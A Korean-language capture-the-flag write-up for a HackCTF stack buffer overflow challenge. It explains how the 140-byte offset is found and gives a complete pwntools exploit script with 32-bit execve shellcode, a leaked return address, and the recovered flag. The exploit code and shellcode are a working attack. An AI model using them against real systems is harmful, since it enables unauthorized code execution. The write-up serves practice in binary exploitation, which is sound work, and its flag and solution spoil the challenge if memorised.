@@ -1,0 +1,74 @@
+풀이
+
+
+힌트
+
+1. 무한반복
+
+2. 데이터가 실행할떄마다 주소가 바뀜 
+
+3. checksec 실행
+
+RELRO 가 부분적으로 걸려있는것 즉 go오버라이딩 쪽만 조심하면
+
+나머지부부는 free 하다.
+
+쉘코드나 ret주소로 풀어도 되는 문제이다.
+
+
+
+gdb 로 분해했을때
+
+루프 부분을 보면
+
+edx, [ebo-0x88] 이 몇번 계속해서 나타난다 
+
+0x88 을 십진수로 바꾸면 136 인데 여기서 SFP 4바이트를 더하면 140바이트 이다
+
+즉 더미는 140바이트이다.
+
+이제 페이로드를 작성 해보면
+
+쉘코드(32bit용) + 더미(140-쉘코드크기) + ret 주소(4바이트)
+
+이다.
+
+
+
+25 바이트 쉘코드 = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
+
+더미 = 140-25 = 115 byte
+
+ret 주소 = p.recv(16)[0:],16
+
+이제 페이로드를 작성해보자.
+
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3006)		# 주소와 호스트
+
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
+# 쉘코드
+
+p.recvuntil('Data : ')		# 문제랑 똑같이 맞춰줘야함
+p.sendline("BBBB")		# 임의의 문자열 주소를 호출하기위해서!!
+buf_addr = int(p.recv(10)[0:],16)		# leak 해줘야하므로 총 10자리 숫자를 받고 전부읽고 16진수화 시킴
+p.recvuntil('Again (y/n)')		
+p.sendline("y")		# y로 설정하면 무조건 y로 통과됨
+p.recvuntil('Data:')
+
+payload = shellcode + "A"*115 + p32(buf_addr)	# 쉘코드 + 버퍼 + p32(buf_addr)
+
+# 보통 문제 p32 ( 버퍼가 작을경우 )  버퍼가 클경우 p64
+
+p.sendline(payload)
+p.interactive()
+
+
+
+cat flag 를 하면
+
+flag 값이 나온다
+
+HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}
